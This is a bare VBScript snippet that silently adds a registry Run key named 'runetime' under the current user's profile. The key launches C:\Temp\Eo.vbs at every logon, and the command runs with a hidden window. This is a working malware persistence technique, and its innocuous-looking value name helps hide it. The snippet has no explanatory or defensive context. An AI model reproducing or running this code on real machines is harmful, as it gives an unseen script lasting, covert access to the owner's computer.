Set oShell = CreateObject ("Wscript.Shell")
    Dim strArgs
    strArgs = "cmd /c REG ADD ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v runetime /t REG_SZ /d  ""C:\Temp\Eo.vbs"""
    oShell.Run strArgs, 0, false
